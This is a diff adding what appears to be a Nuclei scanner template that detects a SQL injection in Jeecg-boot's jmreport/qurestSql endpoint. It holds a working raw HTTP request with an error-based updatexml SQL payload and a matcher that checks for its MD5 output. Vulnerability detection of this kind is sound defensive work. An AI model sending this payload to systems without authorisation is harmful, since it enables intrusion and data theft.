@@ -1,0 +1,37 @@
+id: jeecg-boot-sql-injection
+
+info:
+  name: Jeecg-boot SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a potential SQL Injection vulnerability in the Jeecg-boot application endpoint `/jeecg-boot/jmreport/qurestSql`.
+    The vulnerability allows an attacker to inject SQL payloads, potentially leading to data compromise or application disruption.
+  tags: sql,jeecg-boot,sqli
+
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13
+        Content-Type: application/json; charset=utf-8
+        Host: {{Hostname}}
+        Connection: close
+        Accept-Encoding: gzip, deflate
+
+        {"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e" # MD5 hash of "123456" indicating the payload execution
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "e10adc3949ba59abbe56e057f20f883e"
